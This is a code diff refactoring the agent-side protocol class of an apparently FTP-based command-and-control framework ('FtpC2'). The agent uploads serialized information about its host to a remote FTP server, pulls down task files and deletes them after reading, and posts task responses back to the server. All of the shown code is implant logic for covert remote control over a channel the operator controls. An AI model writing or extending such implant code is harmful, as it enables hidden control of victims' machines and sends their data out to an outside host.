@@ -11,42 +11,33 @@
 
 using FtpC2.Responses;
 using FtpC2.Tasks;
-using System.Net.Http.Json;
 using System.Text.Json;
-using System.Text.Json.Serialization;
 
 namespace FtpAgent
 {
-    internal class AgentProtocol
+    internal class AgentProtocol : ProtocolBase
     {
-        private readonly FtpHelper? FTP;
-
+                
         public AgentProtocol(string host, string username, string password, bool secure, Guid agentSession)
-        {
-            this.FTP = new(host, username, password, secure, agentSession);
-        }
+            : base(host, username, password, secure, agentSession)
+        { }
 
         public void RegisterOrUpdateAgent()
         {
-            if (this.FTP == null)
-                return;
-
             Agent agent = new();
 
-            agent.Refresh(this.FTP.Session);
+            agent.Refresh(GetSession());
 
             string jsonAgent = JsonSerializer.Serialize(agent);
 
-            this.FTP.UploadString(jsonAgent, Shared.PlaceHolders.AgentInformation);
+            UploadString(jsonAgent, Shared.PlaceHolders.AgentInformation);
         }
 
         public List<TaskWrapper> EnumerateTasks()
         {
             List<TaskWrapper> tasks = new();
-            if (this.FTP == null)
-                return tasks;
 
-            List<string> files = this.FTP.ListDirectory();
+            List<string> files = ListDirectory();
 
             string taskSessionCandidate = "";
 
@@ -63,7 +54,7 @@ namespace FtpAgent
                 try
                 {
                     // Download task content
-                    string jsonData = this.FTP.DownloadString(file);
+                    string jsonData = DownloadString(file);
 
                     TaskWrapper? wrappedTask = JsonSerializer.Deserialize<TaskWrapper>(jsonData);
                     TaskWrapper? task = null;
@@ -111,7 +102,7 @@ namespace FtpAgent
                     // Before registering the new task, it is mandatory to remove the existing
                     // task request file from the remote server. This prerequisite step 
                     // ensures smooth creation and operation of the new task.
-                    this.FTP.DeleteFile(file);
+                    DeleteFile(file);
                 }
                 catch
                 {
@@ -124,17 +115,14 @@ namespace FtpAgent
 
         public void RegisterNewResponse(ResponseWrapper response, Guid taskId)
         {
-            if (this.FTP == null)
-                return;
-
             response.TaskId = taskId;
-            response.AgentId = this.FTP.Session ?? Guid.Empty;
+            response.AgentId = GetSession();
             response.DateTime = DateTime.Now;
             response.ResponseType = response.GetType().Name;
 
             string jsonData = JsonSerializer.Serialize(response, response.GetType());
 
-            this.FTP.UploadString(jsonData, $"{Shared.PlaceHolders.ResponseRequest}.{taskId}");
+            UploadString(jsonData, $"{Shared.PlaceHolders.ResponseRequest}.{taskId}");
         }
 
     }
